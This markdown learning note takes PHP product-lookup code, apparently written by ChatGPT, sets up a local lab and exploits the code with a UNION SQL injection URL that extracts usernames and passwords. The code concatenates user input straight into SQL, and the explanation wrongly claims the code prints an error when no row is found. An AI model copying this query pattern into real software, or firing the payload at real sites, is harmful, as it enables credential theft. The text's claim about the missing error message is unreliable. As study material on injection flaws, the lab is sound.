```php
<?php

// Set up database connection
$servername = "localhost";
$username = "yourusername";
$password = "yourpassword";
$dbname = "yourdatabase";
$conn = mysqli_connect($servername, $username, $password, $dbname);

// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// Get ID from input (assuming it's passed in as a GET parameter called "id")
$id = $_GET["id"];

// Query the database to get the product with the specified ID
$sql = "SELECT * FROM products WHERE id = $id";
$result = mysqli_query($conn, $sql);

// Check if any rows were returned
if (mysqli_num_rows($result) > 0) {
    // Loop through the rows and display the product info
    while ($row = mysqli_fetch_assoc($result)) {
        echo "ID: " . $row["id"] . "<br>";
        echo "Name: " . $row["name"] . "<br>";
        echo "Price: $" . $row["price"] . "<br>";
        echo "Description: " . $row["description"] . "<br>";
        // Add any other fields you want to display here
    }

}

// Close database connection
mysqli_close($conn);

?>
```
 sets up a database connection using the `mysqli_connect` function, which takes four parameters: the server name, the username, the password, and the database name. If the connection fails, the script exits with an error message using the `die` function.
 
 then gets the `ID` value from the user input, assuming it is passed in as a `GET` parameter with the name "id". This value will be used to look up the corresponding product in the database.
 
 then it constructs an SQL query to select all columns from the "`products`" table where the "`id`" column matches the input `ID` value, using **string concatenation** to include the input value in the query. The query is then executed using the `mysqli_query` function, which returns a result set.
 
 if any rows were returned by the query using the `mysqli_num_rows` the code loops through each row using the `mysqli_fetch_assoc` function, which **returns the current row as an associative array.** The code then displays the product information by accessing the appropriate columns of the row array.

If no rows were returned by the query, the code displays an error message indicating that `no product was found with the input ID`

Finally, this code closes the database connection using the `mysqli_close` function to free up any resources used by the connection.

---------------------------------

deploy the code on your machine "switch to root":

```bash
cd /var/www/html
mkdir vulnChatGPT
cd vulnChatGPT
vim getprod.php
```
start working on your MySQL database:
```mysql
create database chatGPT;
use chatGPT;

create table products( 
  id INT AUTO_INCREMENT PRIMARY KEY, 
  name varchar(100),
  description varchar(100),
  price DECIMAL(10,2));
  
create table users( 
  id INT AUTO_INCREMENT PRIMARY KEY,
  name varchar(100),
  password varchar(100));

insert into products (name, description, price) VALUES 
  ('pasta', 'i like pasta', 5.33), 
  ('meth','i am the danger',2008), 
  ('cat', 'meow meow', 9.99);
  
insert into users (name, password) VALUES  
  ('hello','world!'), 
  ('wlater','white'), 
  ('meow','meow123'),
  ('admin','this.password.should.be.hashed.tho');
  
create user 'chatGPT'@'localhost' IDENTIFIED BY 'password';
GRANT select on chatGPT.* TO 'chatGPT'@'localhost';
FLUSH PRIVILEGES;

```

go to the source code and change the database variables

```php
// Set up database connection
$servername = "localhost";
$username = "chatGPT";
$password = "password";
$dbname = "chatGPT";
$conn = mysqli_connect($servername, $username, $password, $dbname);
```


then went to start the apache2 service:
```bash
sudo service apache2 start
```
i tried to connect to the apache2 using https://localhost/vulnChatGPT/  but I had the error "An error occurred during a connection to localhost. " you can view the problem reasons here [localhost connection errors](https://github.com/olaayman999/lerningNotes/blob/main/Exploiting%20ChatGPT%20Code/localhost-error.md) but for short it was solved by using http not https

visit http://localhost/vulnChatGPT/ and go to getprod.php

don't forget that the code provide no user interface, thats why the getprod.php is a blank page, ut it is waiting for a id using get request in the url

using the following url with payload "`7 union select null,null,name,password from users`"
http://localhost/vulnChatGPT/getProd.php/?id=7%20union%20select%20null,null,name,password%20from%20users
